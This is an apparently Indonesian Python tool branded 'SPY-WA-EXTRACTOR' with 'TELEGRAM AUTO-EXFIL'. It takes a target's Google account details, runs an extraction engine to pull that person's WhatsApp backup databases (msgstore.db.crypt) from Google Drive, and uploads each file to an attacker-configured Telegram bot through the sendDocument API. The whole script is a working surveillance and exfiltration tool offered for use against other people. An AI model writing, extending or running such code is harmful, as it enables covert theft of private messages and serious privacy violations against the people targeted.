import os
import sys
import time
import requests
import platform
import subprocess

# =========================================================
# CONFIGURASI TELEGRAM BOT (SPY-E & 123TOOL)
# =========================================================
# Dapatkan Token dari @BotFather dan Chat ID dari @userinfobot
BOT_TOKEN = "MASUKKAN_TOKEN_BOT_DI_SINI"
CHAT_ID = "MASUKKAN_CHAT_ID_DI_SINI"
# =========================================================

# Color Palette untuk Terminal UI
G = '\033[32m' # Green
R = '\033[31m' # Red
C = '\033[36m' # Cyan
Y = '\033[33m' # Yellow
W = '\033[0m'  # White
B = '\033[1m'  # Bold

def clear():
    """Membersihkan layar terminal sesuai OS."""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Menampilkan identitas brand SPY-E & 123Tool."""
    print(f"""{C}
      .---.        {W}__________________________________{C}
     /     \      {W}|                                  |{C}
    | () () |     {W}|     {G}SPY-WA-EXTRACTOR V.2.0{W}       |{C}
     \  ^  /      {W}|     {R}TELEGRAM AUTO-EXFIL{W}          |{C}
      |||||       {W}|__________________________________|{C}
      |||||             {Y}PRO - PROJECT NAGA{C}
    
    [+] Mode      : Cloud Forensic & Exfiltration
    [+] Dev       : Rolandino
    [+] System    : {platform.system()} {platform.release()}
    {W}---------------------------------------------------
    """)

def send_to_telegram(file_path):
    """Mengirim file hasil ekstraksi langsung ke Telegram Bot."""
    print(f"{Y}[*] Mengirim database ke Telegram Bot...{W}")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    if BOT_TOKEN == "MASUKKAN_TOKEN_BOT_DI_SINI":
        print(f"{R}[!] ERROR: Token Bot belum dikonfigurasi!{W}")
        return

    try:
        with open(file_path, 'rb') as doc:
            payload = {
                'chat_id': CHAT_ID, 
                'caption': f"📂 {B}[SPY-E ALERT]{W}\nTarget Database Extracted!\nFile: {os.path.basename(file_path)}"
            }
            files = {'document': doc}
            r = requests.post(url, data=payload, files=files, timeout=30)
            
            if r.status_code == 200:
                print(f"{G}[+] BERHASIL: File terkirim ke Telegram!{W}")
            else:
                print(f"{R}[!] GAGAL: Status Code {r.status_code}. Cek Token/ChatID.{W}")
    except Exception as e:
        print(f"{R}[!] ERROR API: {e}{W}")

def run_sync():
    """Menjalankan engine WhatsAppGDExtract dan mendeteksi file baru."""
    print(f"{Y}[*] Menginisialisasi koneksi Google Drive...{W}")
    
    # Pastikan file engine ada di direktori yang sama
    engine_file = "WhatsAppGDExtract.py"
    
    if os.path.exists(engine_file):
        print(f"{C}[*] Menjalankan Engine: {engine_file}...{W}")
        # Menjalankan sinkronisasi cloud
        subprocess.run([sys.executable, engine_file, "sync"])
        
        # Deteksi file database di folder 'extracted_data'
        target_dir = "extracted_data"
        if os.path.exists(target_dir):
            files_found = False
            for file in os.listdir(target_dir):
                if "msgstore.db.crypt" in file:
                    files_found = True
                    full_path = os.path.join(target_dir, file)
                    send_to_telegram(full_path)
            
            if not files_found:
                print(f"{R}[!] Tidak ada file database baru untuk dikirim.{W}")
        else:
            print(f"{R}[!] Folder 'extracted_data' tidak ditemukan. Pastikan login berhasil.{W}")
    else:
        print(f"{R}[!] ERROR: {engine_file} tidak ditemukan di folder ini!{W}")
        print(f"{Y}[i] Silakan download source engine-nya terlebih dahulu.{W}")

def install_requirements():
    """Menginstal semua library yang dibutuhkan secara otomatis."""
    print(f"{G}[*] Menginstal dependensi Python...{W}")
    libs = ["gpsoauth", "pycryptodome", "requests==2.23.0"]
    for lib in libs:
        subprocess.run([sys.executable, "-m", "pip", "install", lib])
    print(f"{G}[+] Selesai! Semua library terpasang.{W}")

def main():
    while True:
        clear()
        banner()
        print(f"[{G}01{W}] {B}Konfigurasi Target{W} (Email/Android ID)")
        print(f"[{G}02{W}] {B}Ekstraksi Cloud & Kirim ke Telegram{W}")
        print(f"[{G}03{W}] {B}Install Semua Dependensi{W}")
        print(f"[{R}00{W}] {B}Keluar{W}")
        
        try:
            choice = input(f"\n{C}SPY-WA-PRO > {W}")
            
            if choice in ['1', '01']:
                print(f"\n{Y}[i] Masukkan data akun target ke dalam file 'config.json'.{W}")
                input("\nTekan Enter untuk kembali...")
            elif choice in ['2', '02']:
                run_sync()
                input("\nTekan Enter untuk kembali...")
            elif choice in ['3', '03']:
                install_requirements()
                input("\nTekan Enter untuk kembali...")
            elif choice in ['0', '00']:
                print(f"{Y}[*] Mematikan Project NAGA. Sampai jumpa!{W}")
                break
            else:
                print(f"{R}[!] Pilihan tidak valid.{W}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{R}[!] Dibatalkan oleh pengguna.{W}")
            break

if __name__ == "__main__":
    main()
